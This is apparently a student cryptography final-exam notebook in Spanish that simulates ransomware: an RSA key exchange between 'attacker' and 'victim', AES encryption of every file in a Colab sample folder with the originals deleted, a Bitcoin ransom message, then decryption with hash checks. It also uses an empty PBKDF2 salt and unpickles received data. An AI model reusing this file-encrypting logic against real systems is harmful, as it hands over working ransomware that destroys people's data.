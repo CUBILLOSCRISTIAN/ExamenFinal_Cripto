{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Criptografía - Final"
      ],
      "metadata": {
        "id": "q2h_8D1rC9Jo"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## **Nombre de los Estudiantes:**\n",
        "\n",
        "- Cristian Cubillos\n",
        "- Emanuel Escobar\n",
        "- David Escorcia\n",
        "- Fredy Fajardo\n"
      ],
      "metadata": {
        "id": "cGYA3sdmC08e"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 26,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8_KzT7XBu42S",
        "outputId": "a4d49d3b-3b6d-4937-b620-16d713192855"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: pycryptodome in /usr/local/lib/python3.10/dist-packages (3.21.0)\n",
            "Requirement already satisfied: cryptography in /usr/local/lib/python3.10/dist-packages (43.0.3)\n",
            "Requirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.10/dist-packages (from cryptography) (1.17.1)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.10/dist-packages (from cffi>=1.12->cryptography) (2.22)\n",
            "Requirement already satisfied: pyfiglet in /usr/local/lib/python3.10/dist-packages (1.0.2)\n"
          ]
        }
      ],
      "source": [
        "!pip install pycryptodome\n",
        "!pip install cryptography\n",
        "!pip install pyfiglet"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Cipher import PKCS1_OAEP, AES\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Signature import pkcs1_15\n",
        "from Crypto.Util.Padding import pad, unpad\n",
        "from Crypto.Random import get_random_bytes\n",
        "from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\n",
        "from cryptography.hazmat.backends import default_backend\n",
        "from cryptography.hazmat.primitives import hashes\n",
        "from cryptography.hazmat.primitives.kdf.scrypt import Scrypt\n",
        "from pyfiglet import Figlet\n",
        "import os\n",
        "import pickle\n",
        "import hashlib"
      ],
      "metadata": {
        "id": "HedRvCvYu6cM"
      },
      "execution_count": 27,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def generar_claves_rsa():\n",
        "    return RSA.generate(2048)\n",
        "\n",
        "def crear_certificado(key, identifier):\n",
        "    public_key = key.publickey().export_key()\n",
        "    return {'id': identifier, 'pk': public_key}\n",
        "\n",
        "def firmar_datos(private_key, data):\n",
        "    # HASH Y LUEGO FIRMA\n",
        "    h = SHA256.new(data)\n",
        "    signature = pkcs1_15.new(private_key).sign(h)\n",
        "    return signature\n",
        "\n",
        "def verificar_firma(public_key, data, signature):\n",
        "    h = SHA256.new(data)\n",
        "    try:\n",
        "        pkcs1_15.new(public_key).verify(h, signature)\n",
        "        return True\n",
        "    except (ValueError, TypeError):\n",
        "        return False\n",
        "\n",
        "def encriptar_rsa(public_key, data):\n",
        "    cipher = PKCS1_OAEP.new(public_key)\n",
        "    return cipher.encrypt(data)\n",
        "\n",
        "def desencriptar_rsa(private_key, encrypted_data):\n",
        "    cipher = PKCS1_OAEP.new(private_key)\n",
        "    return cipher.decrypt(encrypted_data)\n",
        "\n",
        "def generar_bytes_aleatorios():\n",
        "    return get_random_bytes(1024)\n",
        "\n",
        "def generar_clave_aes_a_partir_de_contrasena(password: bytes, salt: bytes = None) -> bytes:\n",
        "    if salt is None:\n",
        "          salt = b''  # Utiliza un salt vacío si no se proporciona uno\n",
        "    # Parámetros de PBKDF2\n",
        "    kdf = PBKDF2HMAC(\n",
        "        algorithm=hashes.SHA256(),\n",
        "        length=32,  # Genera una llave AES de 256 bits\n",
        "        salt=salt,\n",
        "        iterations=100000,\n",
        "        backend=default_backend()\n",
        "    )\n",
        "    key = kdf.derive(password)\n",
        "    return key\n",
        "\n",
        "def encriptar_archivo(file_path, aes_key):\n",
        "    block_size = AES.block_size\n",
        "    with open(file_path, 'rb') as file:\n",
        "        file_data = file.read()\n",
        "    cipher = AES.new(aes_key, AES.MODE_CBC)\n",
        "    ciphered_data = cipher.encrypt(pad(file_data, block_size))\n",
        "    iv = cipher.iv\n",
        "    enc_file_path = file_path + '.enc'\n",
        "    with open(enc_file_path, 'wb') as enc_file:\n",
        "        enc_file.write(iv + ciphered_data)  # Save IV and ciphered data together\n",
        "    os.remove(file_path)\n",
        "    return enc_file_path\n",
        "\n",
        "\n",
        "def desencriptar_archivo(encrypted_file_path, aes_key):\n",
        "    with open(encrypted_file_path, 'rb') as enc_file:\n",
        "        file_content = enc_file.read()\n",
        "\n",
        "    iv = file_content[:AES.block_size]\n",
        "    ciphered_data = file_content[AES.block_size:]\n",
        "\n",
        "    cipher = AES.new(aes_key, AES.MODE_CBC, iv)\n",
        "    plaintext = unpad(cipher.decrypt(ciphered_data), AES.block_size)\n",
        "\n",
        "    orig_file_path = encrypted_file_path.replace('.enc', '')\n",
        "    with open(orig_file_path, 'wb') as dec_file:\n",
        "        dec_file.write(plaintext)\n",
        "    os.remove(encrypted_file_path)\n",
        "    return orig_file_path\n",
        "\n",
        "def calcular_fichero_hash(file_path):\n",
        "    hash_sha256 = hashlib.sha256()\n",
        "    with open(file_path, 'rb') as file:\n",
        "        for chunk in iter(lambda: file.read(4096), b\"\"):\n",
        "            hash_sha256.update(chunk)\n",
        "    return hash_sha256.hexdigest()"
      ],
      "metadata": {
        "id": "vD4jrTPku7nw"
      },
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# === Configuración Inicial ===\n",
        "llave_atacante = generar_claves_rsa()\n",
        "llave_victima = generar_claves_rsa()\n",
        "\n",
        "certificado_atacante = crear_certificado(llave_atacante, \"Attacker\")\n",
        "certificado_víctima = crear_certificado(llave_victima, \"Victim\")\n",
        "\n",
        "# === Intercambio de Claves (Parte A y Parte B) ===\n",
        "llaves_temporales = generar_claves_rsa()\n",
        "llave_publica_temp = llaves_temporales.public_key().export_key()\n",
        "\n",
        "# Parte de A (Víctima)\n",
        "firma_llave_temp = firmar_datos(llave_victima, llave_publica_temp)\n",
        "\n",
        "# Parte de B (Atacante)\n",
        "id_victima = certificado_víctima['id']\n",
        "clave_publica_victima = certificado_víctima['pk']\n",
        "\n",
        "if (verificar_firma(RSA.import_key(clave_publica_victima),llave_publica_temp,firma_llave_temp)):\n",
        "  clave_secreta_compartida = os.urandom(128)\n",
        "  paquete_cifrado = pickle.dumps((clave_secreta_compartida, certificado_atacante['id']))\n",
        "  datos_cifrados = encriptar_rsa(RSA.import_key(llave_publica_temp),paquete_cifrado)\n",
        "  paquete_firmado = pickle.dumps((llave_publica_temp,datos_cifrados,id_victima))\n",
        "  firma_paquete = firmar_datos(llave_atacante, paquete_firmado)\n",
        "\n",
        "# Parte de A (Víctima recibe y verifica)\n",
        "id_atacante = certificado_atacante['id']\n",
        "clave_publica_atacante = certificado_atacante['pk']\n",
        "\n",
        "if (verificar_firma(RSA.import_key(clave_publica_atacante),paquete_firmado,firma_paquete)):\n",
        "  datos_descifrados = desencriptar_rsa(RSA.import_key(llaves_temporales.export_key()),datos_cifrados)\n",
        "  try:\n",
        "      # Intenta deserializar los datos\n",
        "      clave_secreta , identidad_atacante  = pickle.loads(datos_descifrados)\n",
        "  except pickle.UnpicklingError as e:\n",
        "      print(\"Error al deserializar los datos:\", e)\n",
        "\n",
        "\n",
        "# === Encriptado de Archivos ===\n",
        "llave_aes = generar_clave_aes_a_partir_de_contrasena(clave_secreta_compartida)\n",
        "directorio_datos = '/content/sample_data'\n",
        "archivos = os.listdir(directorio_datos)\n",
        "\n",
        "hashes_archivos = {}\n",
        "for archivo in archivos:\n",
        "    ruta_completa = os.path.join(directorio_datos, archivo)\n",
        "    hashes_archivos[archivo] = calcular_fichero_hash(ruta_completa)\n",
        "    ruta_cifrada = encriptar_archivo(ruta_completa, llave_aes)\n",
        "    print(f\"Archivo {archivo} cifrado como {ruta_cifrada}.\")\n",
        "\n",
        "ruta_hashes = os.path.join(directorio_datos, 'hashes_archivos.pkl')\n",
        "with open(ruta_hashes, 'wb') as archivo_hashes:\n",
        "    pickle.dump(hashes_archivos, archivo_hashes)\n",
        "\n",
        "# === Notificación al Usuario ===\n",
        "print(\"Todos sus archivos han sido cifrados. Envíe 1 Bitcoin a la dirección CEDF para recibir la llave de descifrado.\")\n",
        "f = Figlet(font='slant')\n",
        "print(f.renderText('CEDF'))"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "geGWHEfNu80e",
        "outputId": "54bacb63-5d9f-4e3f-8fe2-a6e2e9f0b258"
      },
      "execution_count": 29,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archivo hashes_archivos.pkl cifrado como /content/sample_data/hashes_archivos.pkl.enc.\n",
            "Archivo README.md.enc.enc.enc cifrado como /content/sample_data/README.md.enc.enc.enc.enc.\n",
            "Archivo california_housing_test.csv.enc.enc.enc cifrado como /content/sample_data/california_housing_test.csv.enc.enc.enc.enc.\n",
            "Archivo mnist_train_small.csv.enc.enc.enc cifrado como /content/sample_data/mnist_train_small.csv.enc.enc.enc.enc.\n",
            "Archivo anscombe.json.enc.enc.enc cifrado como /content/sample_data/anscombe.json.enc.enc.enc.enc.\n",
            "Archivo hashes_archivos.pkl.enc.enc cifrado como /content/sample_data/hashes_archivos.pkl.enc.enc.enc.\n",
            "Archivo mnist_test.csv.enc.enc.enc cifrado como /content/sample_data/mnist_test.csv.enc.enc.enc.enc.\n",
            "Archivo california_housing_train.csv.enc.enc.enc cifrado como /content/sample_data/california_housing_train.csv.enc.enc.enc.enc.\n",
            "Todos sus archivos han sido cifrados. Envíe 1 Bitcoin a la dirección CEDF para recibir la llave de descifrado.\n",
            "   ________________  ______\n",
            "  / ____/ ____/ __ \\/ ____/\n",
            " / /   / __/ / / / / /_    \n",
            "/ /___/ /___/ /_/ / __/    \n",
            "\\____/_____/_____/_/       \n",
            "                           \n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# === Paso 5: Verificar y Descifrar Archivos ===\n",
        "\n",
        "# Cargar los hashes almacenados previamente\n",
        "ruta_archivo_hashes = os.path.join(directorio_datos, \"hashes_archivos.pkl\")\n",
        "with open(ruta_archivo_hashes, \"rb\") as archivo:\n",
        "    registros_hashes = pickle.load(archivo)\n",
        "\n",
        "# Iterar sobre los archivos cifrados para descifrarlos y verificar su integridad\n",
        "for archivo_cifrado in archivos:\n",
        "    ruta_archivo_cifrado = os.path.join(directorio_datos, archivo_cifrado + \".enc\")\n",
        "    ruta_descifrada = desencriptar_archivo(ruta_archivo_cifrado, llave_aes)\n",
        "\n",
        "    # Calcular el hash del archivo descifrado\n",
        "    hash_recalculado = calcular_fichero_hash(ruta_descifrada)\n",
        "\n",
        "    # Recuperar el hash original del archivo\n",
        "    hash_original = registros_hashes.get(archivo_cifrado)\n",
        "\n",
        "    # Verificar la correspondencia entre los hashes\n",
        "    if hash_recalculado == hash_original:\n",
        "        print(f\"Archivo {ruta_descifrada} descifrado correctamente y su integridad ha sido confirmada.\")\n",
        "    else:\n",
        "        print(f\"Archivo {ruta_descifrada} descifrado pero no pasó la verificación de integridad.\")\n",
        "\n",
        "# Eliminar el archivo que contiene los hashes originales\n",
        "os.remove(ruta_archivo_hashes)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "JGVPOhUDvVTV",
        "outputId": "7263afd5-afce-412a-ff71-693dbd15a551"
      },
      "execution_count": 30,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archivo /content/sample_data/hashes_archivos.pkl descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/README.md descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/california_housing_test.csv descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/mnist_train_small.csv descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/anscombe.json descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/hashes_archivos.pkl descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/mnist_test.csv descifrado correctamente y su integridad ha sido confirmada.\n",
            "Archivo /content/sample_data/california_housing_train.csv descifrado correctamente y su integridad ha sido confirmada.\n"
          ]
        }
      ]
    }
  ]
}